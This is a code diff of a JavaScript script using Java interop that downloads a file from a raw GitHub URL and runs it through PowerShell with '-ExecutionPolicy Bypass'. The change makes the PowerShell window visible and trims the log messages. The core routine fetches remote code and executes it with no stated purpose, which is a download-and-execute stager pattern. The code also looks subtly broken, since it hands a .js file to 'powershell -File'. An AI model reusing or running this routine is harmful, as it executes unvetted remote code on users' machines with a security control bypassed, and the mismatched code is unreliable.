@@ -15,11 +15,11 @@ function downloadScript(url, outputPath) {
         connection.setRequestMethod("GET");
         connection.setConnectTimeout(10000);
         connection.setReadTimeout(10000);
-        
+
         if (connection.getResponseCode() !== HttpURLConnection.HTTP_OK) {
-            throw new Error("Failed to download file: HTTP " + connection.getResponseCode());
+            throw new Error("Failed to download: HTTP " + connection.getResponseCode());
         }
-        
+
         const reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
         const writer = new FileWriter(new File(outputPath));
         let line;
@@ -28,24 +28,24 @@ function downloadScript(url, outputPath) {
         }
         reader.close();
         writer.close();
-        print("Script downloaded successfully to: " + outputPath);
+        print("Downloaded to: " + outputPath);
     } catch (error) {
-        print("Error downloading the script: " + error.message);
+        print("Download error: " + error.message);
         throw error;
     }
 }
 
 function executeScript(scriptPath) {
     try {
-        const process = Runtime.getRuntime().exec("powershell -ExecutionPolicy Bypass -File " + scriptPath);
+        // Forces a VISIBLE powershell window to open
+        const cmd = "cmd.exe /c start powershell.exe -NoExit -ExecutionPolicy Bypass -File \"" + scriptPath + "\"";
+        const process = Runtime.getRuntime().exec(cmd);
         process.waitFor();
-        const exitCode = process.exitValue();
-        print("Script executed with exit code: " + exitCode);
+        print("Script launched.");
     } catch (error) {
-        print("Error executing the script: " + error.message);
+        print("Execute error: " + error.message);
     }
 }
 
-// Download and execute
 downloadScript("https://raw.githubusercontent.com/duper2-1/wow/refs/heads/main/main.js", scriptPath);
 executeScript(scriptPath);
